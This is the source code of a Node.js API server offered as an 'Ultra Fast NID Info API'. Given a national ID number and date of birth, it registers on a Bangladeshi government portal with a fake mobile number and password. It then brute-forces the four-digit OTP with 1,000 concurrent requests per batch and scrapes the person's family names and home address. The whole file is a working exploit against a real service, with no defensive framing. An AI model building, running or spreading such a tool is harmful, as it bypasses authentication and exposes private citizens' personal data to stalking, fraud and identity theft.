const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration
const MOBILE_PREFIX = "016";
const BATCH_SIZE = 1000; // Increased batch size
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";

// Headers
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://fsmms.dgf.gov.bd',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
};

// Helper functions
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) {
        randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return "#" + uppercase + randomChars;
}

// Generate OTP range in REVERSE order (9999 to 0000)
function generateOTPRange() {
    const range = [];
    for (let i = 9999; i >= 0; i--) {
        range.push(i.toString().padStart(4, '0'));
    }
    return range;
}

// Fast session creation - no retries, no timeouts
async function getSessionAndBypass(nid, dob, mobile, password) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
    const headers = {
        ...BASE_HEADERS,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
    };

    const data = new URLSearchParams({
        "nidNumber": nid,
        "email": "",
        "mobileNo": mobile,
        "dateOfBirth": dob,
        "password": password,
        "confirm_password": password,
        "next1": ""
    });

    const response = await axios.post(url, data.toString(), {
        maxRedirects: 0,
        validateStatus: null,
        headers: headers
    });

    if (response.status === 302 && response.headers.location && response.headers.location.includes('mov-verification')) {
        const cookies = response.headers['set-cookie'] || [];
        
        const session = axios.create({
            maxRedirects: 0,
            validateStatus: null,
            headers: {
                ...BASE_HEADERS,
                'Cookie': cookies.join('; ')
            }
        });

        return {
            cookies: cookies,
            session: session
        };
    } else {
        throw new Error('Bypass Failed - Check NID and DOB');
    }
}

// Fast OTP try - no delays
async function tryOTP(session, cookies, otp) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
    const headers = {
        ...BASE_HEADERS,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookies.join('; '),
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
    };

    const data = new URLSearchParams({
        "otpDigit1": otp[0],
        "otpDigit2": otp[1],
        "otpDigit3": otp[2],
        "otpDigit4": otp[3]
    });

    const response = await session.post(url, data.toString(), {
        maxRedirects: 0,
        validateStatus: null,
        headers: headers
    });

    if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
        return otp;
    }
    return null;
}

// Fast batch processing - all concurrent
async function tryBatch(session, cookies, otpBatch) {
    const promises = otpBatch.map(otp => tryOTP(session, cookies, otp));
    const results = await Promise.allSettled(promises);
    
    for (const result of results) {
        if (result.status === 'fulfilled' && result.value) {
            return result.value;
        }
    }
    return null;
}

async function fetchFormData(session, cookies) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
    const headers = {
        ...BASE_HEADERS,
        'Cookie': cookies.join('; '),
        'Sec-Fetch-Site': 'cross-site',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
    };

    const response = await session.get(url, { headers: headers });
    return response.data;
}

function extractFields(html, ids) {
    const result = {};
    ids.forEach(field_id => {
        const regex = new RegExp(`<input[^>]*id="${field_id}"[^>]*value="([^"]*)"`);
        const match = html.match(regex);
        result[field_id] = match ? match[1] : "";
    });
    return result;
}

function enrichData(contractor_name, result, nid, dob) {
    const mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.fatherName || "",
        "motherName": result.motherName || "",
        "spouseName": result.spouseName || "",
        "gender": "",
        "religion": "",
        "birthPlace": result.nidPerDistrict || "",
        "nationality": result.nationality || "",
        "division": result.nidPerDivision || "",
        "district": result.nidPerDistrict || "",
        "upazila": result.nidPerUpazila || "",
        "union": result.nidPerUnion || "",
        "village": result.nidPerVillage || "",
        "ward": result.nidPerWard || "",
        "zip_code": result.nidPerZipCode || "",
        "post_office": result.nidPerPostOffice || ""
    };

    const address_parts = [
        `à¦¬à¦¾à¦¸à¦¾/à¦¹à§‹à¦²à§à¦¡à¦¿à¦‚: ${result.nidPerHolding || '-'}`,
        `à¦—à§à¦°à¦¾à¦®/à¦°à¦¾à¦¸à§à¦¤à¦¾: ${result.nidPerVillage || ''}`,
        `à¦®à§Œà¦œà¦¾/à¦®à¦¹à¦²à§à¦²à¦¾: ${result.nidPerMouza || ''}`,
        `à¦‡à¦‰à¦¨à¦¿à¦¯à¦¼à¦¨ à¦“à¦¯à¦¼à¦¾à¦°à§à¦¡: ${result.nidPerUnion || ''}`,
        `à¦¡à¦¾à¦•à¦˜à¦°: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
        `à¦‰à¦ªà¦œà§‡à¦²à¦¾: ${result.nidPerUpazila || ''}`,
        `à¦œà§‡à¦²à¦¾: ${result.nidPerDistrict || ''}`,
        `à¦¬à¦¿à¦­à¦¾à¦—: ${result.nidPerDivision || ''}`
    ];

    const filtered_parts = address_parts.filter(part => {
        const parts = part.split(": ");
        return parts[1] && parts[1].trim() && parts[1] !== "-";
    });

    const address_line = filtered_parts.join(", ");
    mapped.permanentAddress = address_line;
    mapped.presentAddress = address_line;
    return mapped;
}

// API Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Ultra Fast NID Info API - NO DELAYS',
        status: 'active',
        endpoints: {
            getInfo: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD'
        },
        features: {
            noTimeouts: true,
            noRetries: true,
            concurrentProcessing: true,
            fastOTPBruteForce: true
        }
    });
});

app.get('/get-info', async (req, res) => {
    try {
        const { nid, dob } = req.query;
        if (!nid || !dob) {
            return res.status(400).json({ error: 'NID and DOB are required' });
        }

        console.log(`ðŸš€ FAST Processing: NID: ${nid}, DOB: ${dob}`);

        // Generate credentials
        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);

        // 1. Get session FAST
        console.log('âš¡ Step 1: Fast session creation...');
        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);
        console.log('âœ“ Session created');

        // 2. Generate OTPs
        console.log('âš¡ Step 2: Generating OTP range...');
        let otpRange = generateOTPRange();

        // 3. Try OTPs FAST - all concurrent
        console.log('âš¡ Step 3: Ultra fast OTP brute force...');
        let foundOTP = null;
        
        for (let i = 0; i < otpRange.length; i += BATCH_SIZE) {
            const batch = otpRange.slice(i, i + BATCH_SIZE);
            console.log(`Trying batch ${Math.floor(i/BATCH_SIZE) + 1}...`);
            
            foundOTP = await tryBatch(session, cookies, batch);
            if (foundOTP) {
                console.log(`ðŸŽ¯ OTP FOUND: ${foundOTP}`);
                break;
            }
        }

        if (foundOTP) {
            // 4. Fetch data FAST
            console.log('âš¡ Step 4: Fetching form data...');
            const html = await fetchFormData(session, cookies);
            const ids = [
                "contractorName", "fatherName", "motherName", "spouseName",
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion",
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice",
                "nidPerHolding", "nidPerMouza"
            ];
            
            const extractedData = extractFields(html, ids);
            const finalData = enrichData(extractedData.contractorName || "", extractedData, nid, dob);
            
            console.log('âœ… SUCCESS: Data retrieved');
            res.json({
                success: true,
                data: finalData,
                sessionInfo: {
                    mobileUsed: mobile,
                    otpFound: foundOTP
                }
            });
        } else {
            console.log('âŒ OTP not found');
            res.status(404).json({
                success: false,
                error: "OTP not found"
            });
        }
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`ðŸš€ ULTRA FAST NID API running on port ${PORT}`);
    console.log(`âš¡ No timeouts, no delays, maximum speed`);
    console.log(`ðŸ“– Endpoint: http://localhost:${PORT}/get-info?nid=YOUR_NID&dob=YYYY-MM-DD`);
});
